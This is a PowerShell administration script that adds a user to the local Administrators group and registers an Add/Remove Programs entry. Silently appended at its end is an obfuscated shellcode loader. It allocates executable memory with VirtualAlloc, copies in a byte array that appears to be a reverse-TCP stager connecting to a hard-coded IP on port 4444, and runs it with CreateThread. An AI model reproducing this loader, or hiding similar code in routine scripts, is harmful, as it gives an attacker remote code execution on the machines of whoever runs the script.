 
 
 
 
 
 

 
 Set-Variable -Name Member -Scope Local -Force  
 Set-Variable -Name Results -Value $false -Scope Global -Force  

 Function AddRemovePrograms($KeyName, $DisplayName, $Version){  

      
      New-PSDrive -Name HKCR -PSProvider Registry -Root HKEY_CLASSES_ROOT  
      Set-Variable -Name AddRemKey -Scope Local -Force  
      Set-Variable -Name guid -Scope Local -Force  
      Set-Variable -Name ProductsKey -Scope Local -Force  

      If (!(Test-Path c:\windows\GSPBox_Icon.bmp)){  
           Copy-Item -Path \\global.gsp\data\clients\na_clients\Build\Add-ins\GSPBox_Icon.bmp -Destination c:\Windows -Force  
      }  
      $AddRemKey = "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall"  
      $ProductsKey = "HKCR:\Installer\Products\"  
      New-Item -Path $AddRemKey -Name $KeyName –Force  
      New-ItemProperty -Path $AddRemKey"\"$KeyName -Name DisplayName -Value $DisplayName -PropertyType String  
      New-ItemProperty -Path $AddRemKey"\"$KeyName -Name DisplayVersion -Value $Version -PropertyType String  
      New-ItemProperty -Path $AddRemKey"\"$KeyName -Name UninstallString -Value " " -PropertyType String  
      New-ItemProperty -Path $AddRemKey"\"$KeyName -Name Publisher -Value "Gresham, Smith and Partners" -PropertyType String  
      New-ItemProperty -Path $AddRemKey"\"$KeyName -Name DisplayIcon -Value "c:\windows\GSPBox_Icon.bmp" -PropertyType String  
      $guid = [guid]::NewGuid().ToString("N")  
      $guid.ToString()  
      $guid = $guid.ToUpper()  
      New-Item -Path $ProductsKey -Name $guid –Force  
      New-ItemProperty -Path $ProductsKey"\"$guid -Name ProductName -Value $DisplayName -PropertyType String -Force  

      
      remove-psdrive -name HKCR  
      Remove-Variable -Name AddRemKey -Scope Local -Force  
      Remove-Variable -Name guid -Scope Local -Force  
      Remove-Variable -Name ProductsKey -Scope Local -Force  

 }  

 Function CheckADForUser ($Member){  

      
      Set-Variable -Name Computer -Scope Local -Force  
      Set-Variable -Name Group -Scope Local -Force  
      Set-Variable -Name LocalGroup -Scope Local -Force  
      Set-Variable -Name User -Scope Local -Force  
      Set-Variable -Name UserNames -Scope Local -Force  
      Set-Variable -Name Users -Scope Local -Force  

      $LocalGroup = "Administrators"  
      $UserNames = @()  
      $Computer = $env:computername  
           $Group= [ADSI]"WinNT://$Computer/$LocalGroup,group"  
           $Users = @($Group.psbase.Invoke("Members"))  
           $Users | ForEach-Object {  
                $UserNames += $_.GetType().InvokeMember("Name", 'GetProperty', $null, $_, $null)  
                Foreach ( $User in $UserNames) {  
                     If ($User -eq $Member) {  
                          $Global:Results = $true  
                          Write-Host $User  
                     }  
                }  
           }  

      
      $UserNames.Clear()  
      Remove-Variable -Name Computer -Scope Local -Force  
      Remove-Variable -Name Group -Scope Local -Force  
      Remove-Variable -Name LocalGroup -Scope Local -Force  
      Remove-Variable -Name User -Scope Local -Force  
      Remove-Variable -Name UserNames -Scope Local -Force  
      Remove-Variable -Name Users -Scope Local -Force  

 }  

 Function AddUserToAD ($Member) {  

      $group = [ADSI]"WinNT://./Administrators,group"  
      $group.Add("WinNT://$Member,user")  

 }  

 cls  
 $Member = ""  
 CheckADForUser $Member  
 If ($Results -eq $true) {  
      AddRemovePrograms $Member $Member "Installed"  
      cls  
      Write-Host $Member" is already in the local administrators group"  
 } else {  
      AddUserToAD $Member  
      CheckADForUser $Member  
      If ($Results -eq $true) {  
           AddRemovePrograms $Member $Member "Installed"  
           cls  
           Write-Host $Member" has been added to the local administrators group"  
      }  
 }  

 
 Remove-Variable -Name Member -Scope Local -Force  
 Remove-Variable -Name Results -Scope Global -Force  
$VJW = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $VJW -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x32,0xbd,0x05,0x8d,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$ZdK=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($ZdK.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$ZdK,0,0,0);for (;;){Start-sleep 60};

